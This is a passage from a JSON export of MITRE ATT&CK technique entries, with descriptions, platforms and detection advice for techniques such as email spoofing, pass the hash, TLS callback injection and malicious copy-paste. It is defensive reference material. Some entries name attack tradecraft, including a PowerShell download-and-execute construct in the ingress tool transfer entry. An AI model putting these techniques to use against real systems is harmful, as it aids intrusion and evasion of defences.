      "description": "Adversaries may compromise third-party servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, including for Command and Control.(Citation: TrendMicro EarthLusca 2022) Instead of purchasing a [Server](https://attack.mitre.org/techniques/T1583/004) or [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may compromise third-party servers in support of operations.\n\nAdversaries may also compromise web servers to support watering hole operations, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or email servers to support [Phishing](https://attack.mitre.org/techniques/T1566) operations.",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1584.004",
      "stix_id": "attack-pattern--e196b5c5-8118-4a1c-ab8a-936586ce3db5",
      "created": "2020-10-01T00:56:25.135000+00:00",
      "modified": "2025-04-15T23:05:41.313000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content",
        "Internet Scan: Response Metadata"
      ],
      "defense_bypassed": [],
      "detection": "Once adversaries have provisioned software on a compromised server (ex: for use as a command and control server), internet scans may reveal servers that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    },
    "T1672": {
      "id": "T1672",
      "name": "Email Spoofing",
      "description": "Adversaries may fake, or spoof, a sender\u2019s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.(Citation: Proofpoint TA427 April 2024) In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. \n\nThis behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).(Citation: Cloudflare DMARC, DKIM, and SPF)(Citation: DMARC-overview)(Citation: Proofpoint-DMARC) Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.(Citation: Proofpoint TA427 April 2024)(Citation: ic3-dprk)\n\nAdversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts(Citation: ic3-dprk) such as [Phishing](https://attack.mitre.org/techniques/T1566). They may also leverage email spoofing for [Impersonation](https://attack.mitre.org/techniques/T1656) of legitimate external individuals and organizations, such as journalists and academics.(Citation: ic3-dprk)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1672",
      "stix_id": "attack-pattern--e1c2db92-7ae3-4e6a-90b4-157c1c1565cb",
      "created": "2025-03-24T16:52:14.061000+00:00",
      "modified": "2025-04-15T19:59:15.222000+00:00",
      "platforms": [
        "Office Suite",
        "Windows",
        "macOS",
        "Linux"
      ],
      "permissions_required": [],
      "data_sources": [
        "Application Log: Application Log Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1526": {
      "id": "T1526",
      "name": "Cloud Service Discovery",
      "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nFor example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\n\nAdversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1526",
      "stix_id": "attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db",
      "created": "2019-08-30T13:01:10.120000+00:00",
      "modified": "2025-04-15T22:03:24.903000+00:00",
      "platforms": [
        "SaaS",
        "IaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Cloud Service: Cloud Service Enumeration",
        "Logon Session: Logon Session Creation"
      ],
      "defense_bypassed": [],
      "detection": "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nNormal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment."
    },
    "T1204.004": {
      "id": "T1204.004",
      "name": "Malicious Copy and Paste",
      "description": "An adversary may rely upon a user copying and pasting code in order to gain execution. Users may be subjected to social engineering to get them to copy and paste code directly into a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).  \n\nMalicious websites, such as those used in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), may present fake error messages or CAPTCHA prompts that instruct users to open a terminal or the Windows Run Dialog box and execute an arbitrary command. These commands may be obfuscated using encoding or other techniques to conceal malicious intent. Once executed, the adversary will typically be able to establish a foothold on the victim's machine.(Citation: CloudSEK Lumma Stealer 2024)(Citation: Sekoia ClickFake 2025)(Citation: Reliaquest CAPTCHA 2024)(Citation: AhnLab LummaC2 2025)\n\nAdversaries may also leverage phishing emails for this purpose. When a user attempts to open an attachment, they may be presented with a fake error and offered a malicious command to paste as a solution.(Citation: Proofpoint ClickFix 2024)(Citation: AhnLab Malicioys Copy Paste 2024)\n\nTricking a user into executing a command themselves may help to bypass email filtering, browser sandboxing, or other mitigations designed to protect users against malicious downloaded files. ",
      "tactic": "execution",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1204.004",
      "stix_id": "attack-pattern--e261a979-f354-41a8-963e-6cadac27c4bf",
      "created": "2025-03-18T12:57:50.188000+00:00",
      "modified": "2025-04-30T17:53:48.667000+00:00",
      "platforms": [
        "Linux",
        "Windows",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Creation",
        "Network Traffic: Network Traffic Content",
        "Command: Command Execution",
        "Process: Process Creation",
        "Network Traffic: Network Connection Creation"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1018": {
      "id": "T1018",
      "name": "Remote System Discovery",
      "description": "Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping](https://attack.mitre.org/software/S0097), <code>net view</code> using [Net](https://attack.mitre.org/software/S0039), or, on ESXi servers, `esxcli network diag ping`.\n\nAdversaries may also analyze data from local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.\n\nAdversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  \n",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1018",
      "stix_id": "attack-pattern--e358d692-23c0-4a31-9eb6-ecc13a8d7735",
      "created": "2017-05-31T21:30:28.187000+00:00",
      "modified": "2025-04-15T19:59:15.859000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows",
        "Network Devices",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Access",
        "Network Traffic: Network Connection Creation",
        "Process: Process Creation"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nMonitor for processes that can be used to discover remote systems, such as <code>ping.exe</code> and <code>tracert.exe</code>, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)"
    },
    "T1046": {
      "id": "T1046",
      "name": "Network Service Discovery",
      "description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021)   \n\nWithin cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.\n\nWithin macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host\u2019s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1046",
      "stix_id": "attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88",
      "created": "2017-05-31T21:30:43.915000+00:00",
      "modified": "2025-04-15T19:59:15.945000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "Containers",
        "Network Devices"
      ],
      "permissions_required": [],
      "data_sources": [
        "Network Traffic: Network Traffic Flow",
        "Command: Command Execution",
        "Cloud Service: Cloud Service Enumeration"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events from legitimate remote service scanning may be uncommon, depending on the environment and how they are used. Legitimate open port and vulnerability scanning may be conducted within the environment and will need to be deconflicted with any detection capabilities developed. Network intrusion detection systems can also be used to identify scanning activity. Monitor for process use of the networks and inspect intra-network flows to detect port scans."
    },
    "T1590.001": {
      "id": "T1590.001",
      "name": "Domain Properties",
      "description": "Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).",
      "tactic": "reconnaissance",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1590.001",
      "stix_id": "attack-pattern--e3b168bd-fcd7-439e-9382-2e6c2f63514d",
      "created": "2020-10-02T15:46:24.670000+00:00",
      "modified": "2025-04-15T22:22:22.764000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [],
      "defense_bypassed": [],
      "detection": "Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    },
    "T1518": {
      "id": "T1518",
      "name": "Software Discovery",
      "description": "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nSuch software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1518",
      "stix_id": "attack-pattern--e3b6daca-e963-4a69-aee6-ed4fd653ad58",
      "created": "2019-09-16T17:52:44.147000+00:00",
      "modified": "2025-04-15T19:59:16.123000+00:00",
      "platforms": [
        "Windows",
        "IaaS",
        "Linux",
        "macOS",
        "ESXi"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: OS API Execution",
        "Command: Command Execution",
        "Process: Process Creation",
        "Firewall: Firewall Enumeration",
        "Firewall: Firewall Metadata"
      ],
      "defense_bypassed": [],
      "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
    },
    "T1538": {
      "id": "T1538",
      "name": "Cloud Service Dashboard",
      "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.",
      "tactic": "discovery",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1538",
      "stix_id": "attack-pattern--e49920b0-6c54-40c1-9571-73723653205f",
      "created": "2019-08-30T18:11:24.582000+00:00",
      "modified": "2025-04-15T19:59:16.288000+00:00",
      "platforms": [
        "IaaS",
        "SaaS",
        "Office Suite",
        "Identity Provider"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Monitor account activity logs to see actions performed and activity associated with the cloud service management console. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.(Citation: AWS Console Sign-in Events)"
    },
    "T1055.005": {
      "id": "T1055.005",
      "name": "Thread Local Storage",
      "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process\u2019 memory space using other [Process Injection](https://attack.mitre.org/techniques/T1055) techniques such as [Process Hollowing](https://attack.mitre.org/techniques/T1055/012).(Citation: FireEye TLS Nov 2017)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process. ",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1055.005",
      "stix_id": "attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744",
      "created": "2020-01-14T01:30:41.092000+00:00",
      "modified": "2025-04-25T14:48:21.860000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Modification",
        "Process: Process Access",
        "Process: OS API Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. "
    },
    "T1622": {
      "id": "T1622",
      "name": "Debugger Evasion",
      "description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \u201cswallow\u201d or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nMalware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program\u2019s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program\u2019s execution to continue.(Citation: Apriorit)\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1622",
      "stix_id": "attack-pattern--e4dc8c01-417f-458d-9ee0-bb0617c1b391",
      "created": "2022-04-01T17:59:46.156000+00:00",
      "modified": "2025-04-15T19:59:16.468000+00:00",
      "platforms": [
        "Windows",
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Process: Process Creation",
        "Process: OS API Execution",
        "Application Log: Application Log Content",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious [Native API](https://attack.mitre.org/techniques/T1106) function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\nMonitor debugger logs for signs of abnormal and potentially malicious activity."
    },
    "T1036.006": {
      "id": "T1036.006",
      "name": "Space after Filename",
      "description": "Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system.\n\nFor example, if there is a Mach-O executable file called <code>evil.bin</code>, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to <code>evil.txt</code>, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to <code>evil.txt </code> (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back).\n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1036.006",
      "stix_id": "attack-pattern--e51137a5-1cdc-499e-911a-abaedaa5ac86",
      "created": "2020-02-10T20:47:10.082000+00:00",
      "modified": "2025-04-25T14:48:22.412000+00:00",
      "platforms": [
        "Linux",
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Metadata"
      ],
      "defense_bypassed": [],
      "detection": "It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious."
    },
    "T1547.007": {
      "id": "T1547.007",
      "name": "Re-opened Applications",
      "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user\u2019s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.",
      "tactic": "persistence",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1547.007",
      "stix_id": "attack-pattern--e5cc9e7a-e61a-46a1-b869-55fb6eab058e",
      "created": "2020-01-24T18:15:06.641000+00:00",
      "modified": "2025-04-16T20:37:22.343000+00:00",
      "platforms": [
        "macOS"
      ],
      "permissions_required": [],
      "data_sources": [
        "Command: Command Execution",
        "File: File Modification"
      ],
      "defense_bypassed": [],
      "detection": "Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened."
    },
    "T1608.006": {
      "id": "T1608.006",
      "name": "SEO Poisoning",
      "description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)\n\nTo help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)\n\nIn addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)",
      "tactic": "resource-development",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1608.006",
      "stix_id": "attack-pattern--e5d550f3-2202-4634-85f2-4a200a1d49b3",
      "created": "2022-09-30T21:14:12.284000+00:00",
      "modified": "2025-04-15T23:01:38.651000+00:00",
      "platforms": [
        "PRE"
      ],
      "permissions_required": [],
      "data_sources": [
        "Internet Scan: Response Content"
      ],
      "defense_bypassed": [],
      "detection": ""
    },
    "T1550.002": {
      "id": "T1550.002",
      "name": "Pass the Hash",
      "description": "Adversaries may \u201cpass the hash\u201d using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\n\nWhen performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\n\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)",
      "tactic": "defense-evasion",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1550.002",
      "stix_id": "attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e",
      "created": "2020-01-30T16:36:51.184000+00:00",
      "modified": "2025-04-16T20:37:22.508000+00:00",
      "platforms": [
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "Logon Session: Logon Session Creation",
        "Active Directory: Active Directory Credential Request",
        "User Account: User Account Authentication"
      ],
      "defense_bypassed": [],
      "detection": "Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.\n\nEvent ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)"
    },
    "T1052": {
      "id": "T1052",
      "name": "Exfiltration Over Physical Medium",
      "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",
      "tactic": "exfiltration",
      "sub_techniques": [],
      "url": "https://attack.mitre.org/techniques/T1052",
      "stix_id": "attack-pattern--e6415f09-df0e-48de-9aba-928c902b7549",
      "created": "2017-05-31T21:30:46.461000+00:00",
      "modified": "2025-04-15T19:59:17.041000+00:00",
      "platforms": [
        "Linux",
        "macOS",
        "Windows"
      ],
      "permissions_required": [],
      "data_sources": [
        "File: File Access",
        "Drive: Drive Creation",
        "Process: Process Creation",
        "Command: Command Execution"
      ],
      "defense_bypassed": [],
      "detection": "Monitor file access on removable media. Detect processes that execute when removable media are mounted."
    },
    "T1105": {
      "id": "T1105",
      "name": "Ingress Tool Transfer",
      "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).(Citation: Google Cloud Threat Intelligence COSCMICENERGY 2023)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).(Citation: T1105: Trellix_search-ms)\n\nFiles can also be transferred using various [Web 